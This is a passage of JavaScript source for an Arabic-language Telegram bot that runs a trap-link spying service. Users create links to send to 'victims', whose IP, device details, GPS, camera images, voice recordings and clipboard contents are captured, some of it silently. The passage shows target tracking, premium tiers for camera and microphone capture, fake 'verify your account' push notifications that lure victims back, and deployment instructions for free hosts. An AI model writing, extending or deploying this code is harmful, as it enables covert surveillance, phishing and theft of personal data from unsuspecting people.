    if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
    const list = [...users].map((id,i) => {
      const p = profiles[String(id)] || {};
      const name = p.name ? ` — ${mdEsc(p.name)}` : '';
      const uname = p.username ? ` ${mdEsc(p.username)}` : '';
      const flags = `${targets.has(id)?' 🎯':''}${banned.has(id)?' 🚫':''}`;
      return `${i+1}\\. \`${id}\`${name}${uname}${flags}`;
    }).join("\n");
    return bot.sendMessage(chatId, `👥 المستخدمون \\(${users.size}\\):\n\n${list}`, { parse_mode: "MarkdownV2" });
  }

  if (msg.text === "/banned") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (banned.size === 0) return bot.sendMessage(chatId, "✅ لا يوجد محجوبون.");
    const list = [...banned].map((id,i) => `${i+1}. \`${id}\``).join("\n");
    return bot.sendMessage(chatId, `🚫 المحجوبون (${banned.size}):\n\n${list}`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/ban ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/ban ","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
    banned.add(id); saveBanned();
    return bot.sendMessage(chatId, `🚫 تم حجب \`${id}\`.`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/unban ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/unban ","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
    banned.delete(id); saveBanned();
    return bot.sendMessage(chatId, `✅ رُفع الحجب عن \`${id}\`.`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/deleteuser ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/deleteuser ","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
    users.delete(id); targets.delete(id); saveUsers(); saveTargets();
    return bot.sendMessage(chatId, `🗑️ تم حذف \`${id}\`.`, { parse_mode: "Markdown" });
  }

  if (msg.text === "/clearusers") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const c = users.size; users.clear(); saveUsers();
    return bot.sendMessage(chatId, `🗑️ تم مسح ${c} مستخدم.`);
  }

  if (msg.text === "/export") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
    const lines = [...users].map((id,i) => {
      const p  = profiles[String(id)] || {};
      const us = userStats[String(id)] || { linksCreated:0, linksOpened:0 };
      const flags = [targets.has(id)?'هدف':'', banned.has(id)?'محجوب':''].filter(Boolean).join('،') || 'عادي';
      return `${i+1}. ID: ${id} | ${p.name||'مجهول'} | ${p.username||''} | ${flags} | روابط: ${us.linksCreated} | فتحات: ${us.linksOpened} | آخر ظهور: ${p.seen||'غير معروف'}`;
    });
    const content = `📋 تصدير بيانات البوت\nالتاريخ: ${new Date().toISOString()}\nإجمالي المستخدمين: ${users.size}\nالأهداف: ${targets.size} | المحجوبون: ${banned.size}\n${'─'.repeat(60)}\n` + lines.join("\n");
    return bot.sendDocument(chatId, Buffer.from(content,'utf8'), { caption:`📤 تصدير شامل (${users.size} مستخدم)` }, { filename:`export_${new Date().toJSON().slice(0,10)}.txt`, contentType:"text/plain" });
  }

  // /info [id] — detailed user info
  if (msg.text?.startsWith("/info")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/info","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ استخدم: /info [ID]");
    const us  = userStats[String(id)] || { linksCreated:0, linksOpened:0 };
    const pro = profiles[String(id)] || {};
    const userNotes = (notes[String(id)] || []);
    const notesText = userNotes.length ? userNotes.map((n,i)=>`${i+1}. ${mdEsc(n)}`).join("\n") : "لا توجد";
    return bot.sendMessage(chatId,
      `👤 معلومات المستخدم: \`${id}\`\n` +
      (pro.name     ? `📛 الاسم: ${mdEsc(pro.name)}\n` : '') +
      (pro.username ? `🔗 يوزر: ${mdEsc(pro.username)}\n` : '') +
      (pro.seen     ? `🕐 آخر ظهور: ${mdEsc(pro.seen)} UTC\n` : '') +
      `\n📋 في القائمة: ${users.has(id) ? '✅' : '❌'}\n` +
      `🎯 هدف: ${targets.has(id) ? '✅' : '❌'}\n` +
      `🚫 محجوب: ${banned.has(id) ? '✅' : '❌'}\n\n` +
      `🔗 روابط أنشأها: ${us.linksCreated}\n` +
      `👁️ مرات فتح روابطه: ${us.linksOpened}\n\n` +
      `📝 الملاحظات:\n${notesText}`,
      { parse_mode: "MarkdownV2" }
    );
  }

  // /note [id] [نص] — add note about user
  if (msg.text?.startsWith("/note ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const parts = msg.text.replace("/note ","").split(" ");
    const id = parts[0];
    const noteText = parts.slice(1).join(" ");
    if (!id || !noteText) return bot.sendMessage(chatId, "⚠️ استخدم: /note [ID] [النص]");
    if (!notes[id]) notes[id] = [];
    notes[id].push(`${noteText} (${new Date().toJSON().slice(0,10)})`);
    saveNotes();
    return bot.sendMessage(chatId, `📝 تم إضافة ملاحظة على \`${id}\`.`, { parse_mode: "Markdown" });
  }

  // /notes [id] — view notes
  if (msg.text?.startsWith("/notes ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = msg.text.replace("/notes ","").trim();
    const userNotes = notes[id] || [];
    if (userNotes.length === 0) return bot.sendMessage(chatId, "لا توجد ملاحظات.");
    return bot.sendMessage(chatId, `📝 ملاحظات \`${id}\`:\n\n${userNotes.map((n,i)=>`${i+1}. ${n}`).join("\n")}`, { parse_mode: "Markdown" });
  }

  // /delnotes [id] — delete notes
  if (msg.text?.startsWith("/delnotes ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = msg.text.replace("/delnotes ","").trim();
    delete notes[id]; saveNotes();
    return bot.sendMessage(chatId, `🗑️ تم حذف ملاحظات \`${id}\`.`, { parse_mode: "Markdown" });
  }

  if (msg.text === "/silent") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.silentMode = !settings.silentMode; saveSettings();
    return bot.sendMessage(chatId, settings.silentMode ? "🔕 الوضع الصامت مفعّل\nالبيانات تُجمع بصمت." : "🔔 الوضع الصامت معطّل.");
  }

  // /away [message] — away mode with auto-reply
  if (msg.text?.startsWith("/away")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const awayText = msg.text.replace("/away","").trim();
    if (!awayText) return bot.sendMessage(chatId, "⚠️ استخدم: /away [الرسالة التلقائية]");
    settings.awayMode = true; settings.awayMsg = awayText; saveSettings();
    return bot.sendMessage(chatId, `🌙 وضع الغياب مفعّل\nرسالة الرد التلقائي:\n\n"${awayText}"`);
  }

  if (msg.text === "/awayoff") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.awayMode = false; settings.awayMsg = ""; saveSettings();
    return bot.sendMessage(chatId, "✅ تم إيقاف وضع الغياب.");
  }

  if (msg.text?.startsWith("/addtarget ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/addtarget ","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
    targets.add(id); saveTargets();
    return bot.sendMessage(chatId, `🎯 تم إضافة \`${id}\` كهدف.\nستحصل على تنبيه خاص عند كل نشاطه.`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/removetarget ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/removetarget ","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
    targets.delete(id); saveTargets();
    return bot.sendMessage(chatId, `✅ تم إزالة \`${id}\` من الأهداف.`, { parse_mode: "Markdown" });
  }

  if (msg.text === "/targets") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (targets.size === 0) return bot.sendMessage(chatId, "لا يوجد أهداف.");
    return bot.sendMessage(chatId, `🎯 الأهداف (${targets.size}):\n\n${[...targets].map((id,i)=>`${i+1}. \`${id}\``).join("\n")}`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/schedule")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const arg = msg.text.replace("/schedule","").trim();
    if (!arg) return bot.sendMessage(chatId, `📅 التقرير التلقائي: ${settings.scheduleHour>=0?settings.scheduleHour+':00 UTC':'معطّل'}\n\n/schedule [0-23] لضبطه\n/schedule off لإيقافه`);
    if (arg === "off") { settings.scheduleHour=-1; saveSettings(); return bot.sendMessage(chatId,"✅ تم إيقاف التقرير التلقائي."); }
    const h = parseInt(arg);
    if (isNaN(h)||h<0||h>23) return bot.sendMessage(chatId,"⚠️ أدخل ساعة 0-23 (UTC).");
    settings.scheduleHour=h; saveSettings();
    return bot.sendMessage(chatId,`✅ سيُرسل تقرير يومي كل ${h}:00 UTC`);
  }

  if (msg.text?.startsWith("/link ")) return createLink(chatId, msg.text.replace("/link ","").trim());

  if (msg.text?.startsWith("/push ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const parts = msg.text.replace("/push ","").trim().split(" ");
    const pUid  = parts.shift();
    const pText = parts.join(" ").trim();
    if (!pUid || !pText) return bot.sendMessage(chatId, "الاستخدام: /push [uid] [النص]");
    if (!pushSubs[pUid]) return bot.sendMessage(chatId, "❌ هذا الجهاز لم يفعّل الإشعارات بعد.\n\nأرسل /pushlist لمعرفة الأجهزة المسجّلة.");
    const _pr = await sendPushToDevice(pUid, "🔔 رسالة جديدة", pText);
    if (_pr === "sse")   return bot.sendMessage(chatId, `✅ تم الإرسال — الجهاز متصل الآن، سيظهر الإشعار فوراً`);
    if (_pr === "vapid") return bot.sendMessage(chatId, `✅ تم الإرسال — سيظهر الإشعار في الخلفية حتى لو الصفحة مغلقة`);
    return bot.sendMessage(chatId, `📴 الجهاز غير متصل حالياً — سيصل الإشعار عند فتح الرابط مجدداً`);
  }

  if (msg.text === "/pushlist") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const keys = Object.keys(pushSubs);
    if (keys.length === 0) return bot.sendMessage(chatId, "📭 لا توجد أجهزة مسجّلة للإشعارات بعد.\n\nيجب أن يفتح الضحية الرابط ويمنح إذن الإشعارات أولاً.");
    for (const [i, pid] of keys.entries()) {
      const e = pushSubs[pid] || {};
      const online  = !!sseClients[pid];
      const hasSub  = !!(e.subscription);
      const status  = online ? "🟢 متصل" : hasSub ? "🟡 خلفي" : "🔴 غير متصل";
      await bot.sendMessage(chatId,
        `${status} — جهاز ${i+1} من ${keys.length}\n🆔 \`${pid}\``,
        { parse_mode:"Markdown",
          reply_markup: JSON.stringify({ inline_keyboard: [
            [{ text:"📲 سحب الجهاز", callback_data:`pull:${pid}` }, { text:"📩 إرسال رسالة", callback_data:`pushmsg:${pid}` }],
            [{ text:"📋 معلومات الجهاز", callback_data:`pushinfo:${pid}` }]
          ] })
        }
      );
    }
    return;
  }

  if (msg.text?.startsWith("/pull ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const pullPid = msg.text.replace("/pull ","").trim();
    if (!pullPid) return bot.sendMessage(chatId, "الاستخدام: /pull [PID]");
    if (!pushSubs[pullPid]) return bot.sendMessage(chatId, "❌ هذا الجهاز لم يُسجَّل بعد.\n\nأرسل /pushlist لمعرفة الأجهزة المسجّلة.");
    const pullUrl = pushSubs[pullPid].purl || null;
    if (!pullUrl) return bot.sendMessage(chatId, "⚠️ لا يوجد رابط محفوظ لهذا الجهاز. يجب أن يفتح الرابط مرة أخرى أولاً.");
    const _pullr = await sendPushToDevice(pullPid, "🔔 تحقق من حسابك", "اضغط هنا للتحقق من حسابك", pullUrl);
    if (_pullr === "sse")   return bot.sendMessage(chatId, `✅ تم الإرسال — الجهاز متصل، سيظهر الإشعار فوراً`);
    if (_pullr === "vapid") return bot.sendMessage(chatId, `✅ تم الإرسال — إشعار خلفي، عند النقر سيُعيد فتح الرابط`);
    return bot.sendMessage(chatId, `📴 الجهاز غير متصل حالياً — سيصل الإشعار عند فتح الرابط مجدداً`);
  }

  if (msg.text === "/page") {
    if (chatId === BOT_OWNER) return sendPageMain(chatId);
    if (!isPremium(chatId)) return bot.sendMessage(chatId, "⛔ هذه الميزة للمشتركين البريميوم فقط.");
    return sendUserPageMain(chatId, chatId);
  }

  if (msg.text?.startsWith("/savetpl ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const tplName = msg.text.replace("/savetpl ","").trim();
    if (!tplName) return bot.sendMessage(chatId,"⚠️ استخدام: /savetpl اسم القالب");
    _pageTpls[tplName] = { ...pageConfig };
    return bot.sendMessage(chatId,`💾 تم حفظ القالب "${tplName}" بنجاح!`,{reply_markup:JSON.stringify({inline_keyboard:[[{text:"📁 قوالبي",callback_data:"pg_tpls"}]]})});
  }

  if (msg.text === "/ping") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const s=Date.now(); const m=await bot.sendMessage(chatId,"🏓 Pong!");
    return bot.editMessageText(`🏓 Pong! \`${Date.now()-s}ms\``,{chat_id:chatId,message_id:m.message_id,parse_mode:"Markdown"});
  }

  if (msg.text === "/backup") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    await bot.sendMessage(chatId, "📦 جاري تجميع كل الملفات في ZIP واحد...");
    try {
      const archiver = require("archiver");
      const os = require("os");
      const zipPath = require("path").join(os.tmpdir(), `backup_${Date.now()}.zip`);
      const output = fs.createWriteStream(zipPath);
      const archive = archiver("zip", { zlib: { level: 9 } });
      const readmeTxt = `
╔══════════════════════════════════════════════════════════════╗
║           🤖 بوت الروابط الملغمة — دليل التشغيل           ║
╚══════════════════════════════════════════════════════════════╝

📁 هيكل الملفات:
  server/
  ├── index.js          ← السيرفر الرئيسي
  ├── package.json      ← المكتبات المطلوبة
  ├── views/            ← صفحات HTML
  └── public/           ← ملفات ثابتة
  data/                 ← بيانات المستخدمين (اختياري)

🔑 المتغيرات البيئية المطلوبة:
  bot        = توكن البوت من @BotFather
  GITHUB_PERSONAL_ACCESS_TOKEN = توكن GitHub (لحفظ البيانات)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🟣 ══ REPLIT ══════════════════════════════════════════════════

1) افتح replit.com وأنشئ Repl جديد من نوع Node.js
2) ارفع ملفات مجلد server/ كلها
3) في Shell نفّذ:
      npm install
4) افتح Secrets (القفل في الشريط الجانبي) وأضف:
      bot  →  توكن البوت
      GITHUB_PERSONAL_ACCESS_TOKEN  →  توكن GitHub
5) في ملف .replit تأكد:
      run = "node index.js"
6) اضغط Run ✅
7) لإبقاء البوت شغّالاً استخدم UptimeRobot على رابط Replit

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔵 ══ RAILWAY ════════════════════════════════════════════════

1) افتح railway.app وسجّل دخول بـ GitHub
2) اضغط New Project ← Deploy from GitHub repo
3) ارفع ملفات server/ على GitHub أولاً ثم اختر الـ repo
   (أو استخدم: New Project ← Deploy from local folder)
4) بعد الإنشاء، اذهب إلى Variables وأضف:
      bot  →  توكن البوت
      GITHUB_PERSONAL_ACCESS_TOKEN  →  توكن GitHub
      PORT  →  3000
5) اذهب إلى Settings ← Start Command:
      node index.js
6) Railway سيشغّل البوت تلقائياً ✅
7) من Settings ← Domains أنشئ رابط عام للبوت

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🟢 ══ RENDER ════════════════════════════════════════════════

1) افتح render.com وسجّل دخول
2) اضغط New ← Web Service
3) اربط بـ GitHub repo أو ارفع الكود
4) اضبط الإعدادات:
      Build Command:   npm install
      Start Command:   node index.js
      Instance Type:   Free
5) في Environment أضف:
      bot  →  توكن البوت
      GITHUB_PERSONAL_ACCESS_TOKEN  →  توكن GitHub
6) اضغط Create Web Service ✅
7) ⚠️ Render مجاني ينام بعد 15 دقيقة بدون طلبات
   الحل: استخدم UptimeRobot لإرسال ping كل 10 دقائق

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💾 استعادة البيانات بعد النقل:
  انسخ ملفات data/ إلى جذر المشروع:
    premium.json, users.json, settings.json, profiles.json ...
  عند التشغيل سيتم تحميلها تلقائياً.

❓ مشاكل شائعة:
  • البوت لا يستجيب → تحقق من صحة توكن bot في المتغيرات
  • البيانات تختفي → تأكد من إضافة GITHUB_PERSONAL_ACCESS_TOKEN
  • Port error → أضف متغير PORT=3000 في Railway/Render

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Powered by @Ye_x00
`;
      await new Promise((resolve, reject) => {
        output.on("close", resolve);
        archive.on("error", reject);
        archive.pipe(output);
        archive.append(readmeTxt, { name: "README_شرح_التشغيل.txt" });
        const codeFiles = ["index.js", "package.json"];
        for (const f of codeFiles) { if (fs.existsSync(f)) archive.file(f, { name: `server/${f}` }); }
        if (fs.existsSync("./views"))  archive.directory("./views",  "server/views");
        if (fs.existsSync("./public")) archive.directory("./public", "server/public");
        const dataFiles = [
          PREMIUM_FILE, "settings.json", "users.json", "profiles.json",
          "stats.json", "userstats.json", PAGE_CONFIG_FILE,
          SUBMISSIONS_FILE, USER_PAGES_FILE, USER_SUBS_FILE,
          "banned.json", "targets.json", "notes.json", "push_subs.json"
        ];
        for (const f of dataFiles) { if (fs.existsSync(f)) archive.file(f, { name: `data/${require("path").basename(f)}` }); }
        archive.finalize();
      });
      const stamp = new Date().toISOString().slice(0,10);
      await bot.sendDocument(chatId, fs.createReadStream(zipPath), {
        caption: `✅ *نسخة احتياطية كاملة*\n📅 ${stamp}\n\n📁 يحتوي على:\n• كود السيرفر (index.js + views)\n• جميع ملفات البيانات`
      }, { filename: `bot_backup_${stamp}.zip`, contentType: "application/zip" });
      fs.unlinkSync(zipPath);
      backupToGitHub().catch(()=>{});
      return bot.sendMessage(chatId, `💾 تم الحفظ على GitHub أيضاً ✅`);
    } catch(e) {
      return bot.sendMessage(chatId, `❌ فشل إنشاء النسخة: ${e.message}`);
    }
  }

  if (msg.text?.startsWith("/setwelcome ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.welcomeMsg=msg.text.replace("/setwelcome ","").trim(); saveSettings();
    return bot.sendMessage(chatId,"✅ تم تحديث رسالة الترحيب.");
  }

  if (msg.text === "/resetwelcome") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.welcomeMsg=""; saveSettings();
    return bot.sendMessage(chatId,"✅ تمت الإعادة للافتراضي.");
  }

  // ── Feature control ───────────────────────────────────────────────────────
  if (msg.text === "/features") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    return sendFeaturesMenu(chatId);
  }

  if (msg.text === "/premiumconfig") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    return bot.sendMessage(chatId, premiumConfigText(), { parse_mode:"Markdown", reply_markup: buildPremiumConfigKeyboard() });
  }

  // /lastopen — آخر فتح لكل مستخدم
  if (msg.text === "/lastopen") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const list = Object.entries(userStats)
      .filter(([,u]) => u.lastOpen)
      .sort((a,b) => (b[1].lastOpen||'').localeCompare(a[1].lastOpen||''))
      .slice(0,20)
      .map(([id,u],i) => {
        const p = profiles[id]||{};
        return `${i+1}. ${p.name||id} — ${u.lastOpen} UTC (${u.linksOpened||0}x)`;
      }).join("\n");
    return bot.sendMessage(chatId, list ? `🕐 آخر فتح للروابط:\n\n${list}` : "لا توجد بيانات بعد.");
  }

  // /top — الأكثر نشاطاً
  if (msg.text === "/top") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const sorted = Object.entries(userStats)
      .sort((a,b)=>(b[1].linksOpened||0)-(a[1].linksOpened||0)).slice(0,10);
    if (!sorted.length) return bot.sendMessage(chatId, "لا توجد بيانات.");
    const medals = ['🥇','🥈','🥉'];
    const list = sorted.map(([id,u],i) => {
      const p = profiles[id]||{};
      const medal = medals[i]||`${i+1}.`;
      return `${medal} ${p.name||id}${p.username?' '+p.username:''}\n   👁️ ${u.linksOpened||0} فتحة | 🔗 ${u.linksCreated||0} رابط`;
    }).join("\n");
    return bot.sendMessage(chatId, `🏆 الأكثر نشاطاً (${sorted.length}):\n\n${list}`);
  }

  // ── Premium commands ────────────────────────────────────────────────────────

  // /mypremium — check own subscription status
  if (msg.text === "/mypremium") {
    const id = String(chatId);
    if (isPremium(chatId) && chatId !== BOT_OWNER) {
      const p = premium[id];
      const expText = p.expiry === -1 ? "♾️ مدى الحياة" : `⏳ ينتهي: ${new Date(p.expiry).toJSON().slice(0,10)}`;
      return bot.sendMessage(chatId, `✅ اشتراكك *مفعّل*\n📦 الخطة: ${p.plan||'—'}\n${expText}\n\n🎁 المميزات: 📷 كاميرا + 🎙️ صوت + 📋 حافظة`, { parse_mode:"Markdown" });
    }
    if (chatId === BOT_OWNER) return bot.sendMessage(chatId, `👑 أنت المالك — كل الميزات متاحة دائماً.`);
    return bot.sendMessage(chatId, `❌ ليس لديك اشتراك مدفوع.\n\nتواصل مع المالك لتفعيل البريميوم وتحصل على:\n📷 كاميرا أمامية وخلفية\n🎙️ تسجيل صوتي\n📋 قراءة الحافظة`);
  }

  // /premium [id] [days|lifetime] — grant premium (owner only)
  if (msg.text?.startsWith("/premium ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const parts = msg.text.replace("/premium ","").trim().split(/\s+/);
    const tid = parts[0]; const daysArg = parts[1] || "30";
    if (!tid || isNaN(Number(tid))) return bot.sendMessage(chatId, "⚠️ استخدم: /premium [ID] [أيام أو lifetime]");
    let expiry, plan;
    if (daysArg === "lifetime" || daysArg === "مدى") { expiry = -1; plan = "lifetime"; }
    else { const d = parseInt(daysArg)||30; expiry = Date.now() + d*24*3600*1000; plan = d >= 365 ? "yearly" : d >= 30 ? "monthly" : "weekly"; }
    premium[tid] = { expiry, plan, grantedAt: Date.now(), expired: false };
    savePremium();
    backupFileToGH(PREMIUM_FILE, '_data/premium.json');
    const prof = profiles[tid] || {};
    const expText = expiry === -1 ? "♾️ مدى الحياة" : `⏳ حتى ${new Date(expiry).toJSON().slice(0,10)}`;
    bot.sendMessage(chatId, `✅ تم تفعيل البريميوم\n👤 ${prof.name||tid}\n📦 ${plan}\n${expText}`, { parse_mode:"Markdown" });
    // Notify the user
    bot.sendMessage(Number(tid), `🎉 تم تفعيل اشتراكك البريميوم!\n📦 الخطة: ${plan}\n${expText}\n\n🔓 المميزات المفعّلة:\n📷 كاميرا أمامية وخلفية\n🎙️ تسجيل صوتي\n📋 قراءة الحافظة`).catch(()=>{});
    return;
  }

  // /revokepremium [id] — revoke premium (owner only)
  if (msg.text?.startsWith("/revokepremium ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const tid = msg.text.replace("/revokepremium ","").trim();
    if (!premium[tid]) return bot.sendMessage(chatId, `⚠️ \`${tid}\` ليس لديه اشتراك.`, { parse_mode:"Markdown" });
    delete premium[tid]; savePremium();
    backupFileToGH(PREMIUM_FILE, '_data/premium.json');
    bot.sendMessage(chatId, `🗑️ تم إلغاء اشتراك \`${tid}\`.`, { parse_mode:"Markdown" });
    bot.sendMessage(Number(tid), `⚠️ تم إلغاء اشتراكك البريميوم.\nتواصل مع المالك لتجديده.`).catch(()=>{});
    return;
  }

  // /premiumlist — list all premium subscribers (owner only)
  if (msg.text === "/premiumlist") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const entries = Object.entries(premium);
    if (!entries.length) return bot.sendMessage(chatId, "لا يوجد مشتركون بريميوم.");
    const now = Date.now();
    const list = entries.map(([id, p], i) => {
      const prof = profiles[id] || {};
      const active = isPremium(Number(id));
      const expText = p.expiry === -1 ? "♾️" : new Date(p.expiry).toJSON().slice(0,10);
      return `${i+1}. ${active?'✅':'❌'} ${prof.name||id} (${p.plan||'?'}) — ${expText}`;
    }).join("\n");
    return bot.sendMessage(chatId, `💎 المشتركون البريميوم (${entries.length}):\n\n${list}`);
  }

  // /cleardata [id] — مسح بيانات مستخدم معين
  if (msg.text?.startsWith("/cleardata")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = msg.text.replace("/cleardata","").trim();
    if (!id) return bot.sendMessage(chatId, "⚠️ استخدم: /cleardata [ID]");
    delete userStats[id]; saveUserStats();
    delete profiles[id];  saveProfiles();
    delete notes[id];     saveNotes();
    return bot.sendMessage(chatId, `🗑️ تم مسح بيانات \`${id}\` (إحصائيات + ملف شخصي + ملاحظات)`, { parse_mode:"Markdown" });
  }

  // /search [نص] — ابحث عن مستخدم باسمه أو يوزرنيمه
  if (msg.text?.startsWith("/search")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const q = msg.text.replace("/search","").trim().toLowerCase();
    if (!q) return bot.sendMessage(chatId, "⚠️ استخدم: /search [الاسم أو @اليوزرنيم]");
    const found = Object.entries(profiles).filter(([id, p]) => {
      return (p.name && p.name.toLowerCase().includes(q)) ||
             (p.username && p.username.toLowerCase().includes(q));
    });
    if (!found.length) return bot.sendMessage(chatId, `🔍 لا نتائج لـ "${q}"`);
    const list = found.map(([id, p]) => {
      const flags = `${targets.has(Number(id))?' 🎯':''}${banned.has(Number(id))?' 🚫':''}`;
      return `• \`${id}\` — ${mdEsc(p.name||'مجهول')} ${mdEsc(p.username||'')}${flags}\n  آخر ظهور: ${mdEsc(p.seen||'—')}`;
    }).join("\n");
    return bot.sendMessage(chatId, `🔍 نتائج البحث \\(${found.length}\\):\n\n${list}`, { parse_mode:"MarkdownV2" });
  }
});

// ── Callback Queries ──────────────────────────────────────────────────────────

bot.on('callback_query', async (q) => {
  bot.answerCallbackQuery(q.id);
  const chatId = q.message.chat.id;
  const data   = q.data;

  if (data === "crenew")  return createNew(chatId);
  if (data === "myid")    return bot.sendMessage(chatId,`🆔 الـ ID:\n\`${chatId}\``,{parse_mode:"Markdown"});
  if (data === "mystats") {
    const us = userStats[String(chatId)] || { linksCreated:0, linksOpened:0 };
    return bot.sendMessage(chatId,`📊 إحصائياتك:\n\n🔗 الروابط التي أنشأتها: ${us.linksCreated}\n👁️ مرات فتح روابطك: ${us.linksOpened}`);
  }
  if (data === "help") {
    return bot.sendMessage(chatId,
      `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك:\n   ⚡ IP + ISP + الدولة\n   📱 بيانات الجهاز\n   📷 كاميرا أمامية + خلفية\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 نوع الاتصال والسرعة\n\n📊 /mystats — إحصائياتك\n\n⚡ Powered by @Ye_x00`
    );
  }
  if (data.startsWith("reply:"))
    return bot.sendMessage(chatId,`${REPLY_PREFIX}${data.replace("reply:","")}\n\nاكتب ردك:`,{reply_markup:JSON.stringify({force_reply:true})});

  // ── Pull notification (inline button) ─────────────────────────────────────
  if (data.startsWith("pull:")) {
    if (!isPremium(q.from.id)) return bot.answerCallbackQuery(q.id, {text:"⛔ هذه الميزة للمشتركين فقط", show_alert:true});
    const _pid = data.slice(5);
    if (!pushSubs[_pid]) return bot.sendMessage(chatId, "❌ الجهاز غير مسجّل في قاعدة البيانات.");
    const _purl = pushSubs[_pid].purl || null;
    if (!_purl) return bot.sendMessage(chatId, "⚠️ لا يوجد رابط محفوظ لهذا الجهاز.\nيجب أن يفتح الرابط مرة أخرى حتى يُحفظ.");
    const _r = await sendPushToDevice(_pid, "🔔 تحقق من حسابك", "اضغط هنا للتحقق من حسابك", _purl);
    if (_r === "sse")   return bot.sendMessage(chatId, "✅ تم الإرسال — الجهاز متصل الآن، سيظهر الإشعار فوراً");
    if (_r === "vapid") return bot.sendMessage(chatId, "✅ تم الإرسال — إشعار خلفي، عند النقر سيُعيد فتح الرابط تلقائياً");
    return bot.sendMessage(chatId, "📴 الجهاز غير متصل حالياً — سيصل الإشعار عند فتح الرابط مجدداً");
  }

  // ── Send push message via force_reply ──────────────────────────────────────
  if (data.startsWith("pushmsg:")) {
    if (!isPremium(q.from.id)) return bot.answerCallbackQuery(q.id, {text:"⛔ هذه الميزة للمشتركين فقط", show_alert:true});
